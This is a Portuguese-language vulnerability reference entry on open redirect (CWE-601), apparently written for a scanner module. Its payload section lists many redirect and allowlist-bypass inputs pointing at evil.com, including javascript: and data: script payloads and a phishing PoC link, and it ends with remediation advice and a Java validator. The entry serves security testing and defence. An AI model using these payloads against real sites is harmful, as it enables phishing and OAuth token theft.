---
id: open_redirect
title: "Open Redirect"
module: "openredirect"
severity: "MEDIUM"
cwe_id: "CWE-601"
cwe_title: "URL Redirection to Untrusted Site ('Open Redirect')"
cvss_vector: "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
vrt_id: "broken_authentication_and_session_management.open_redirect"
---

## Summary
Parâmetro que controla um redirecionamento aceita destinos externos arbitrários, permitindo phishing convincente, roubo de tokens OAuth e bypass de validações baseadas em domínio confiável.

## Description
Aplicações usam parâmetros como `next`, `return`, `redirect_uri` ou `url` para levar o usuário de volta após login, logout, pagamento ou troca de idioma. Quando o destino não é validado contra uma allowlist, o atacante cria um link no domínio legítimo que redireciona para um site malicioso. A vítima confia na URL inicial e pode ser induzida a inserir credenciais, baixar malware ou autorizar um fluxo OAuth.

O bug é frequentemente subestimado, mas se torna crítico quando encadeado com:
- OAuth `redirect_uri` que aceita redirect interno.
- SSRF com follow redirects.
- Cache poisoning de redirecionamentos.
- Roubo de token em fragmento/query.
- Bypass de allowlist de domínio em webhooks e integrações.

## Impact
- Phishing de alta credibilidade usando o domínio legítimo como fachada.
- Roubo de credenciais, cookies, tokens OAuth e códigos de autorização.
- Bypass de controles que confiam em "redirect interno" para validar destino.
- Redirecionamento para malware ou páginas de fraude.
- Impacto de reputação e abuso de marca; severidade sobe quando há vazamento de token.

## Payloads and Bypasses
```text
# Destinos externos diretos
?url=https://evil.com
?next=https://evil.com
?redirect=https://evil.com
?return=https://evil.com
?returnTo=https://evil.com
?dest=https://evil.com
?destination=https://evil.com
?continue=https://evil.com
?target=https://evil.com
?rurl=https://evil.com
?u=https://evil.com
?link=https://evil.com
?out=https://evil.com
?go=https://evil.com
?checkout_url=https://evil.com

# Scheme-relative e variações de parsing
?url=//evil.com
?url=////evil.com
?url=\/\/evil.com
?url=%2f%2fevil.com
?url=%252f%252fevil.com
?url=https:evil.com
?url=https:///evil.com
?url=https://alvo.com@evil.com
?url=https://alvo.com.evil.com
?url=https://evil.com#alvo.com
?url=https://evil.com?alvo.com
?url=https://alvo.com%2f@evil.com
?url=https://alvo.com%5c@evil.com
?url=https://alvo.com:443@evil.com

# Path/encoding tricks
?url=https://alvo.com/cb/../../evil
?url=https://alvo.com/cb%2f..%2f..%2fevil
?url=/redirect?url=https://evil.com
?url=javascript:alert(document.domain)
?url=data:text/html,<script>alert(1)</script>

# Unicode/IDN
?url=https://alvo.com。evil.com
?url=https://αlvo.com
```

PoC:
```html
<a href="https://alvo.com/login?next=https://evil.com">Login seguro</a>
```

Bypass de validação por allowlist:
```text
- Allowlist por substring: https://alvo.com.evil.com
- Allowlist por startsWith: https://alvo.com@evil.com
- Allowlist por regex sem âncora: https://evil.com/alvo.com
- Dupla codificação: %252f%252fevil.com
- Redirecionamento em dois saltos: /out?url=/out?url=https://evil.com
- Open redirect interno em subdomínio confiável
```

Casos reais e mentalidade de ataque (RWBH): Twitter (`next`), Shopify (`return_url`) e Uber (`redirect_url`) mostram que o bug vira crítico quando encadeado com OAuth, SSRF ou phishing de marca.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `url`, `uri`, `next`, `return`, `returnTo`, `return_url`, `redirect`, `redirect_uri`, `redirect_url`, `dest`, `destination`, `continue`, `target`, `rurl`, `u`, `link`, `out`, `go`, `goto`, `view`, `checkout_url`, `callback`, `back`.
- **Paths comuns:** `/login`, `/logout`, `/auth`, `/oauth/authorize`, `/sso`, `/redirect`, `/out`, `/r`, `/go`, `/link`, `/checkout`, `/payment/return`.
- **Sinais:** parâmetro de URL refletido em `Location`; `Location` contém entrada do usuário; allowlist por prefixo; `302` para host externo.

## Recommendation
1. Não aceitar URLs arbitrárias. Usar allowlist de destinos exatos ou um mapa server-side de chaves (`?next=dashboard`, `?next=billing`).
2. Se for inevitável aceitar URL, parsear com biblioteca de URL, exigir esquema `https`, host exato na allowlist e rejeitar userinfo, fragmento e portas não previstas.
3. Preferir caminhos relativos internos e validar que começam com `/` e não com `//` ou `/\`.
4. Bloquear `javascript:`, `data:`, `vbscript:` e esquemas não HTTP(S).
5. Não confiar em `Referer` para decidir destino; validar o parâmetro explicitamente.
6. Em OAuth, validar `redirect_uri` por correspondência exata e não permitir redirecionamento interno aberto no callback.
7. Adicionar página de aviso ("Você está saindo de alvo.com") para destinos externos legítimos.
8. Exemplo Java:
```java
private static final Set<String> ALLOWED_HOSTS = Set.of("app.alvo.com", "www.alvo.com");

public String safeRedirect(String raw) {
    URI uri = URI.create(raw);
    if (uri.getUserInfo() != null || uri.getFragment() != null) throw new IllegalArgumentException();
    if (!"https".equalsIgnoreCase(uri.getScheme())) throw new IllegalArgumentException();
    if (!ALLOWED_HOSTS.contains(uri.getHost())) throw new IllegalArgumentException();
    return uri.toString();
}
```
9. Cobrir o fluxo com testes que tentem `//evil.com`, `%2f%2f`, `@`, backslash e dupla codificação.
